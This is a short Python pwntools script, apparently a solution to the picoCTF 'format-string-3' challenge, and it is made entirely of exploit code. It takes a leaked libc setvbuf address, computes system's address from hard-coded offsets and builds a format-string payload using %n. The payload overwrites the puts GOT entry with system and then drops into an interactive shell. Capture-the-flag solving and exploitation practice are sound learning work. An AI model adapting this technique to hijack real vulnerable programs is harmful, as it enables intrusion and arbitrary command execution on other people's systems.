import pwn

# pwn.context.terminal = ['tmux', 'splitw', '-h']

p = pwn.process('format-string-3')
# pwn.gdb.attach(p, '''
#     break printf
#     continue
# ''')
# p = pwn.remote("rhea.picoctf.net", 49776)


p.recvuntil(b"Here's the address of setvbuf in libc: ")
hex_string = p.recvline()

# Get shell address
setvbuf_address = int(hex_string.strip(), 16)
print(f"setvbuf = {setvbuf_address:#x}")

system_address = (setvbuf_address - 0x7A3F0) + 0x4F760
system_address_last_4_bytes = (system_address & 0xffffffff)

print(f"shell = {system_address:#x}")
print(f"shell_address_last_4_bytes {system_address_last_4_bytes:#x}")
buf_start_index = (0x7fff5983be80 - 0x7fff5983bd78) // 0x08 + 5  # the index of buf[0]

payload_target_address_index = buf_start_index + 10 # the index of buf[10]
payload_target_address_start = 10 * 8

payload = b""
payload += f"%{system_address_last_4_bytes}c".encode()    # new puts address
payload += f"%{payload_target_address_index}$n".encode()
while len(payload) < payload_target_address_start:
    payload += f"c".encode() * (payload_target_address_start - len(payload))

payload += f"\x18\x40\x40\x00\x00\x00\x00\x00".encode()  # override address, puts GOT

print(f"{payload=}")
input("press any key to send payload..")
p.sendline(payload)

p.interactive()
